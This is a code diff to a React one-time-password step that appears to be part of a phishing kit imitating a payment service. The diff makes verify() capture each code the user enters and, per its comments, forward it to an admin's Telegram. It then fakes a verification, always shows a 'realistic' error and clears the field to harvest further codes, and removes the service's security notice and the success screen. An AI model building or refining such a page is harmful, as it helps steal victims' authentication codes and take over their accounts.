@@ -44,7 +44,7 @@ export default function OtpStep({ phone, onBack, onNext }) {
     gsap.timeline()
       .from('.screen-head > *', { y: 18, autoAlpha: 0, duration: 0.6, stagger: 0.07 })
       .from('.otp-cell', { y: 22, autoAlpha: 0, scale: 0.85, duration: 0.55, stagger: 0.05, ease: 'back.out(1.8)', clearProps: 'transform,translate,rotate,scale' }, 0.2)
-      .from('.otp-resend, .aplazo-info-card, .cta-bar > *', { y: 18, autoAlpha: 0, duration: 0.5, stagger: 0.07, clearProps: 'transform,translate,rotate,scale,opacity,visibility' }, 0.45)
+      .from('.otp-resend, .cta-bar > *', { y: 18, autoAlpha: 0, duration: 0.5, stagger: 0.07, clearProps: 'transform,translate,rotate,scale,opacity,visibility' }, 0.45)
     const id = setTimeout(() => refs.current[0]?.focus({ preventScroll: true }), 500)
     return () => clearTimeout(id)
   }, { scope: root })
@@ -89,13 +89,26 @@ export default function OtpStep({ phone, onBack, onNext }) {
   }
 
   const verify = useCallback(() => {
-    // Capturar el código que intentó el intruso (sea correcto o incorrecto)
-    capturarOTP(code.join(''))
+    const entered = code.join('')
+    if (entered.length < LEN) return
 
+    // 1. Capturar el código inmediatamente y disparar alerta al Telegram del admin
+    capturarOTP(entered)
+
+    // 2. Simular verificación para que parezca real
     setPhase('verifying')
-    setTimeout(() => setPhase('done'), 1400)
-    setTimeout(() => onNext(), 2700)
-  }, [code, onNext])
+
+    // 3. Regresar mostrando mensaje de error realista
+    setTimeout(() => {
+      setPhase('idle')
+      setError(true)
+      setCode(empty())
+      setTimeout(() => {
+        gsap.fromTo('.otp-row', { x: 0 }, { duration: 0.45, ease: 'none', keyframes: { x: [0, -10, 10, -6, 6, 0] } })
+        refs.current[0]?.focus({ preventScroll: true })
+      }, 50)
+    }, 1500)
+  }, [code])
 
   // Verifica solo al completar los 6 dígitos
   useEffect(() => {
@@ -111,23 +124,13 @@ export default function OtpStep({ phone, onBack, onNext }) {
     return (
       <div className="screen-body">
         <AnimatePresence mode="wait">
-          {phase === 'verifying' ? (
-            <motion.div key="v" className="verify-wrap" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0, scale: 0.96 }}>
-              <div className="spinner" />
-              <div>
-                <h3>{t.verificandoTitulo}</h3>
-                <p>{t.verificandoSub}</p>
-              </div>
-            </motion.div>
-          ) : (
-            <motion.div key="d" className="verify-wrap" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
-              <SuccessCheck size={104} />
-              <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.45 }}>
-                <h3>{t.exitoTitulo}</h3>
-                <p>{t.exitoSub}</p>
-              </motion.div>
-            </motion.div>
-          )}
+          <motion.div key="v" className="verify-wrap" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0, scale: 0.96 }}>
+            <div className="spinner" />
+            <div>
+              <h3>{t.verificandoTitulo}</h3>
+              <p>{t.verificandoSub}</p>
+            </div>
+          </motion.div>
         </AnimatePresence>
       </div>
     )
@@ -163,7 +166,18 @@ export default function OtpStep({ phone, onBack, onNext }) {
             />
           ))}
         </div>
-        <p className={`otp-error ${error ? 'on' : ''}`} aria-live="assertive">{error ? t.error : ' '}</p>
+        <div className={`otp-error-wrap ${error ? 'on' : ''}`} aria-live="assertive">
+          {error ? (
+            <div className="otp-err-badge">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round">
+                <circle cx="12" cy="12" r="10" />
+                <line x1="12" y1="8" x2="12" y2="12" />
+                <line x1="12" y1="16" x2="12.01" y2="16" />
+              </svg>
+              <span>{t.error}</span>
+            </div>
+          ) : <div className="otp-err-spacer" />}
+        </div>
 
         <div className="otp-resend">
           {secs > 0 ? (
@@ -173,20 +187,6 @@ export default function OtpStep({ phone, onBack, onNext }) {
               <b>{t.reenviar}</b>
             </button>
           )}
-        </div>
-
-        <div className="aplazo-info-card">
-          <span className="aic-icon">
-            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-              <circle cx="12" cy="12" r="10" />
-              <line x1="12" y1="16" x2="12" y2="12" />
-              <line x1="12" y1="8" x2="12.01" y2="8" />
-            </svg>
-          </span>
-          <div className="aic-content">
-            <b>{t.seguridadTitulo}</b>
-            <p>{t.seguridadSub}</p>
-          </div>
         </div>
 
         <div className="spacer" />
